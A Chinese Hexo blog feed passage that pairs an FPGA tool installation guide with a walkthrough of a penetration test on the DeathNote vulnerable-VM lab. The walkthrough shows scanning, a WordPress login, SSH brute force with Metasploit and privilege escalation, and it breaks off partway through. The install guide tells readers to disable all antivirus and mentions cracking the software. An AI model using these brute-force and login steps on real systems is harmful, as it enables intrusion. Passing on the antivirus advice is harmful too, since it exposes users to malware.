50%;"><p>​                    d.点击“Next”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.d.png" style="zoom:67%;"><p>​                    e.路径位置就选择“C:\FPGA\Quartus II\quartus\bin”(选择对应的Quartus文件夹即可)，点击“Next”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.e.png" style="zoom:67%;"><p>​                    f.勾选新的器件库，然后点击“Next”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.f.png" style="zoom:67%;"><p>​                    g.这里同样是说需要使用的空间，以及剩余磁盘空间，直接点击“Next”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.g.png" style="zoom:67%;"><p>​                    h.等待进度条走完</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.h.png" style="zoom:67%;"><p>​                    i.安装完成，点击“Finish”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.i.png" style="zoom:67%;"><h2 id="四、ModelSim-的安装"><a href="#四、ModelSim-的安装" class="headerlink" title="四、ModelSim 的安装"></a>四、ModelSim 的安装</h2><p>​    1.解压压缩包</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.1.png" style="zoom:67%;"><p>​    2.运行可执行程序</p><p>​    3.进入 <code>welcom</code> 界面，点击下一步</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.3.png" style="zoom:67%;"><p>​    4.安装位置选择之前我们创建好的位置 “C:\FPGA\modelsim”</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.4.png" style="zoom:67%;"><p>​    5.许可协议界面，选择同意</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.5.png" style="zoom:67%;"><p>​    6.安装界面</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.6.png" style="zoom:67%;"><p>​    7.出现一个创建快捷方式的弹窗，选择是</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.7.png" style="zoom:67%;"><p>​    8.又出现一个弹窗，直接选择是</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.8.png" style="zoom:67%;"><p>​    9.第三个弹窗，同样选择是</p><img src="/2022/04/06/FPGA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.9.png" style="zoom:67%;"><p>​            1.接着出现一个是否重启电脑的选项，选择“否”.到此，FPGA的基本环境搭建也就结束了</p>]]></content>
    
    
    <categories>
      
      <category>FPGA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>FPGA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>“FPGA”</title>
    <link href="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/"/>
    <url>/2022/04/06/%E2%80%9CFPGA%E2%80%9D/</url>
    
    <content type="html"><![CDATA[<h2 id="FPGA环境搭建"><a href="#FPGA环境搭建" class="headerlink" title="FPGA环境搭建"></a>FPGA环境搭建</h2><h3 id="一、Quartus-II-的下载"><a href="#一、Quartus-II-的下载" class="headerlink" title="一、Quartus II 的下载"></a>一、Quartus II 的下载</h3><p>百度网盘下载链接：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>pan.baidu.com<span class="hljs-regexp">/s/</span><span class="hljs-number">1</span>a9d-bq9RZmWrRV542X4IEA<br> 提取码：ifte<br></code></pre></td></tr></table></figure><h3 id="二、安装前的准备"><a href="#二、安装前的准备" class="headerlink" title="二、安装前的准备"></a>二、安装前的准备</h3><p>​    1.在C盘意外的盘内新建一个文件夹，命名为 <code>FPGA</code> (我这里使用的虚拟机，所以就在C盘新建文件夹)，盘符的空间最好有20G以上</p><p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source_posts\“FPGA”\2.1.png"></p><p>​    2.打开 <code>FPGA</code> 文件夹，在里面新建 <code>Quartus II</code> 和 <code>modelSim</code> 文件夹</p><p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source_posts\“FPGA”\2.2.png"></p><h3 id="三、Quartus-II-的安装"><a href="#三、Quartus-II-的安装" class="headerlink" title="三、Quartus II 的安装"></a>三、Quartus II 的安装</h3><p>​        1.解压压缩包</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.3.1.png" style="zoom: 67%;"><p>​        2.使用管理员运行可执行程序(<code>运行前退出所有杀软，包括Windows Defender</code>)</p><p>​        3.进入安装向导</p><p>​            1.进入 welcom 界面，点击“Next”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.3.1.png" style="zoom:67%;"><p>​            2.勾选“I accept the agreement”并点击“Next”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.3.2.png" style="zoom: 67%;"><p>​            3.选择安装路径，选择刚刚我们创建的“<code>Quartus II</code>”文件夹，然后点击“<code>Next</code>”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.3.3.png" style="zoom:67%;"><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.3.3.1.png" style="zoom:67%;"><p>​            4.这里就是安装一些器件库，全部勾选，然后点击“Next”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.3.4.png" style="zoom:67%;"><p>​            5.这里表示要使用的空间，以及剩余磁盘空间大小，点击“Next”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.3.5.png" style="zoom:67%;"><p>​            6.安装过程(等待时间可能会比较久)，等待完成后点击“Next”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.3.6.png" style="zoom:67%;"><p>​            7.安装完成，这里直勾选“Create shortcuts on Desktop”点击“Finish”。至此，Quartus II就安装完成了</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.3.7.png" style="zoom:67%;"><p>​            8.我们打开“Quartus II”软件，这里先选择试用30天，后续讲解破解过程</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.3.8.png" style="zoom:67%;"><p>​            9.这里未提示需要安装器件库，所以可以直接使用</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.3.9.png" style="zoom: 50%;"><p>​                    <strong>a.</strong> <strong>器件库的安装，首先需要下载对应的器件库</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址：https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/z123459985/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">105349357</span><br><br>说明：<br></code></pre></td></tr></table></figure><p>​                    b.将下载好的器件库，放到“Quartus II\quartus\bin”目录下</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.b.png" style="zoom: 67%;"><p>​                    c.打开“Quartus II”软件，在工具栏中选择“Tools”，然后选择“Install Devices”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.c.png" style="zoom: 50%;"><p>​                    d.点击“Next”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.d.png" style="zoom:67%;"><p>​                    e.路径位置就选择“C:\FPGA\Quartus II\quartus\bin”(选择对应的Quartus文件夹即可)，点击“Next”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.e.png" style="zoom:67%;"><p>​                    f.勾选新的器件库，然后点击“Next”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.f.png" style="zoom:67%;"><p>​                    g.这里同样是说需要使用的空间，以及剩余磁盘空间，直接点击“Next”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.g.png" style="zoom:67%;"><p>​                    h.等待进度条走完</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.h.png" style="zoom:67%;"><p>​                    i.安装完成，点击“Finish”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\3.i.png" style="zoom:67%;"><h2 id="四、ModelSim-的安装"><a href="#四、ModelSim-的安装" class="headerlink" title="四、ModelSim 的安装"></a>四、ModelSim 的安装</h2><p>​    1.解压压缩包</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\4.1.png" style="zoom:67%;"><p>​    2.运行可执行程序</p><p>​    3.进入 <code>welcom</code> 界面，点击下一步</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\4.3.png" style="zoom:67%;"><p>​    4.安装位置选择之前我们创建好的位置 “C:\FPGA\modelsim”</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\4.4.png" style="zoom:67%;"><p>​    5.许可协议界面，选择同意</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\4.5.png" style="zoom:67%;"><p>​    6.安装界面</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\4.6.png" style="zoom:67%;"><p>​    7.出现一个创建快捷方式的弹窗，选择是</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\4.7.png" style="zoom:67%;"><p>​    8.又出现一个弹窗，直接选择是</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\4.8.png" style="zoom:67%;"><p>​    9.第三个弹窗，同样选择是</p><img src="/2022/04/06/%E2%80%9CFPGA%E2%80%9D/blog\source\_posts\“FPGA”\4.9.png" style="zoom:67%;"><p>​            1.接着出现一个是否重启电脑的选项，选择“否”.到此，FPGA的基本环境搭建也就结束了</p>]]></content>
    
    
    <categories>
      
      <category>FPGA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>FPGA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DeathNote靶机渗透过程</title>
    <link href="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/"/>
    <url>/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="DeathNote靶机渗透过程"><a href="#DeathNote靶机渗透过程" class="headerlink" title="DeathNote靶机渗透过程"></a>DeathNote靶机渗透过程</h2><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>攻击机：<code>Kali-Linux-2021.3</code></p><p>目标靶机：<code>Deathnote</code></p><p>平台：<code>VMware Workstation Pro 15.6</code></p><p>难度：<code>easy</code></p><p>均为 <code>NAT</code> 模式</p><h2 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2><h3 id="1-主机嗅探"><a href="#1-主机嗅探" class="headerlink" title="1.主机嗅探"></a>1.主机嗅探</h3><p>kali<code>和</code>DeathNote<code>处于同一网段，查看</code>kali<code>当前</code>IP`</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/1.jpg"></p><p>可知<code>kali</code>的<code>IP</code>地址为<code>192.168.239.184/24</code>，进行网段扫描</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">netdiscover</span> -r <span class="hljs-number">192.168.239.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/2.jpg"></p><p>扫描结果显示靶机的<code>IP</code>地址为<code>192.168.239.186</code></p><p>注释：在同为<code>NAT</code>模式下，无法扫描出<code>IP</code>，不妨试试进入靶机的拯救模式</p><p>具体方法可以看：<a href="https://app.yinxiang.com/fx/d0e7d6f3-305d-457c-b10a-f3080d438617">https://app.yinxiang.com/fx/d0e7d6f3-305d-457c-b10a-f3080d438617</a></p><h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sS <span class="hljs-number">192.168.239.168</span><br></code></pre></td></tr></table></figure><p>这里可以看到靶机开放了22和80端口</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/3.jpg"></p><h2 id="二、漏洞挖掘"><a href="#二、漏洞挖掘" class="headerlink" title="二、漏洞挖掘"></a>二、漏洞挖掘</h2><h3 id="1-dirb扫描网站目录"><a href="#1-dirb扫描网站目录" class="headerlink" title="1.dirb扫描网站目录"></a>1.dirb扫描网站目录</h3><p>​    1.首先使用dirb对网站的特殊文件进行扫描。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dirb http:<span class="hljs-string">//192.168.239.186</span> -X <span class="hljs-string">.txt</span>,<span class="hljs-string">.html</span>,<span class="hljs-string">.php</span>,<span class="hljs-string">.bak</span>,<span class="hljs-string">.bac</span>,<span class="hljs-string">.sql</span>,<span class="hljs-string">.php.bac</span>,<span class="hljs-string">.jpg</span><br></code></pre></td></tr></table></figure><p>​    扫描到三个文件</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/4.jpg"></p><p>​    2.我们使用dirb对网站目录进行扫描。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">239.168</span> -r<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/5.jpg"></p><h3 id="2-访问其web页面"><a href="#2-访问其web页面" class="headerlink" title="2.访问其web页面"></a>2.访问其web页面</h3><p><strong>信息1</strong></p><p>访问网站80端口，192.168.239.186:80,</p><p>​    <img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/6.jpg"></p><p>之后跳转到 <code>http://deathnote.vuln/wordpress/</code></p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/7.jpg"></p><p>跳转到一个无法正常打开的页面，我们需要修改本机的hosts文件，手动将这个不存在的网页指向靶机</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/8.jpg"></p><p><strong>注释：实际添加内同以实际情况为准，环境不同，IP不同</strong></p><p>返回刷新浏览器</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/9.jpg"></p><p><strong>信息2</strong></p><p>访问<a href="http://192.168.239.186/robots.txt%E3%80%82%E8%BF%99%E9%87%8C%E6%8F%90%E7%A4%BA%E6%9C%89%E4%B8%80%E4%B8%AA**important.jpg**,%E8%BF%98%E6%9C%89%E7%94%A8%E6%88%B7**ryuk">http://192.168.239.186/robots.txt。这里提示有一个**important.jpg**,还有用户**ryuk</a>**</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/10.jpg"></p><p><strong>信息3</strong></p><p>访问图片路径，试着打开图片，发现网页无法显示，所以把它下载下来</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/11.jpg"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">239.186</span><span class="hljs-regexp">//im</span>portant.jpg<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/12.jpg"></p><p>打开图片，它显示一段文字，这里出现了名字有Soichiro Yagami，light，kira。并且提供了用户名：user.txt。并且提示密码在网站的提示页。</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/13.jpg"></p><p>因此，我们点击网页上的<strong>HINT</strong>,点开后提示，咋回到server上的note.txt或者看L的留言。L的留言应该指的就是下面的“my fav line is iamjustic3”</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/14.jpg"></p><h3 id="3-WordPress后台登陆"><a href="#3-WordPress后台登陆" class="headerlink" title="3.WordPress后台登陆"></a><strong>3.WordPress后台登陆</strong></h3><p>经过多次尝试，我使用用户名：<strong>kira</strong>，密码：<strong>iamjustic3</strong>成功登陆了wp后台</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/15.jpg"></p><p>根据提示，我们现在需要找到note.txt</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/16.jpg"></p><p>在 <code>侧边栏—&gt;Media—&gt;Library</code>，可看到<code>notes.txt</code></p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/17.jpg"></p><p>下载下来</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>deathnote.vuln<span class="hljs-regexp">/wordpress/</span>wp-content<span class="hljs-regexp">/uploads/</span><span class="hljs-number">2021</span><span class="hljs-regexp">/07/</span>notes.txt<br></code></pre></td></tr></table></figure><p>查看<code>notes.txt</code>文件</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> <span class="hljs-keyword">notes</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/18.jpg"></p><p>可以发现，<code>notes.txt</code>是个字典文件，可用于<code>ssh</code>登陆</p><h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><h3 id="1-SSH爆破"><a href="#1-SSH爆破" class="headerlink" title="1.SSH爆破"></a><strong>1.SSH爆破</strong></h3><p>启动<code>msf6</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br></code></pre></td></tr></table></figure><p>使用<code>SSH_login</code>模块、</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>ssh/ssh_login<br></code></pre></td></tr></table></figure><p>查看当前选项列表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/19.jpg"></p><p>设置密码字典</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">set</span> pass_file <span class="hljs-string">./notes.txt</span><br></code></pre></td></tr></table></figure><p>设置目标主机</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> rhost <span class="hljs-comment">192.168.239.186</span><br></code></pre></td></tr></table></figure><p>设置用户名，尝试用户名为<code>l</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> username <span class="hljs-comment">l</span><br></code></pre></td></tr></table></figure><p>开始爆破</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/20.jpg"></p><p>爆破完成，用户名：<code>l</code>,密码<code>death4me</code></p><h3 id="2-SSH远程登陆"><a href="#2-SSH远程登陆" class="headerlink" title="2.SSH远程登陆"></a><strong>2.SSH远程登陆</strong></h3><p>使用刚刚爆破出的用户名和密码进行<code>SSH</code>连接</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> l@<span class="hljs-number">192.168.239.186</span><br><span class="hljs-literal">yes</span><br>death4me<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/21.jpg"></p><h3 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a><strong>3.提权</strong></h3><p>检查当前用户 l 的权限</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo l</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/22.jpg"></p><p>提示该用户不存在 <code>sudoers</code>列表中</p><p>查看当前家目录的文件列表</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ls -lha</span><br></code></pre></td></tr></table></figure><p>存在<code>user.txt</code>文件，查看该文件，发现是<code>BrainFuck</code>编码</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/23.jpg"></p><p>进行解码，在线工具：<a href="https://ctf.bugku.com/tool/brainfuck">https://ctf.bugku.com/tool/brainfuck</a></p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/24.jpg"></p><p>查看 <code>/home</code>目录下有哪些用户</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">ls</span> <span class="hljs-string">/home</span> -lha<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/25.jpg"></p><p>进入<code>kira</code>的家目录，查看文件列表</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/home/kira</span> &amp;&amp; <span class="hljs-keyword">ls</span> -lha<br></code></pre></td></tr></table></figure><p>发现存在 <code>kira.txt</code>文件，但是没有 <code>l</code>并没有权限查看</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/26.jpg"></p><p>继续在靶机中寻找其他有价值的信息，发现在<code>/opt</code>下存在名为<code>L</code>的目录，查看<code>L</code>目录下的内容</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/opt/L</span> &amp;&amp; <span class="hljs-keyword">ls</span> -lha<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/27.jpg"></p><p>进入到<code>kira-case</code>目录，发现有个名为<code>case-file.txt</code>文件，查看该文件内容</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">cd ./kira-<span class="hljs-keyword">case</span> &amp;&amp; cat <span class="hljs-keyword">case</span>-<span class="hljs-keyword">file</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/28.jpg"></p><p>最后一句话，在提示 <code>fake-notebook-rule</code>目录下有我们想要得到的内容，切换至 <code>fake-notebook-rule</code>目录</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">../fake-notebook-rule</span> &amp;&amp; <span class="hljs-keyword">ls</span> -lha<br></code></pre></td></tr></table></figure><p>里面存在两个文件，<code>case.wav</code>和 <code>hine</code></p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/29.jpg"></p><p>查看<code>case.wav</code>内容</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span> <span class="hljs-keyword">case</span>.wav<br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/30.jpg"></p><p>内容是一串<code>16进制</code>编码</p><p>查看<code>hint</code>内容</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">cat <span class="hljs-keyword">hint</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/31.jpg"></p><p>根据提示我们使用<code>cyberchef</code>进行编码</p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/32.jpg"></p><p>在左侧侧边栏拖拽<code>From Hex(来自16进制)</code>到<code>Recipe</code>模块，在<code>Input</code>模块中输入那串<code>16进制</code>编码，<code>Output</code>模块中就会输出结果，由输出结果可知结果又为一串<code>Base64</code>编码，再从侧边栏拖入<code>From Base64</code>模块到<code>Recipe</code>模块，<code>Output</code>模块中就会输出解码后的内容，内容为<code>passwd : kiraisevil</code></p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/33.jpg"></p><p>尝试切换至用户<code>kira</code></p><p><img src="/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/34.jpg"></p><p>查看用户 <code>kira</code>的权限</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo -l</span><br></code></pre></td></tr></table></figure><p><img 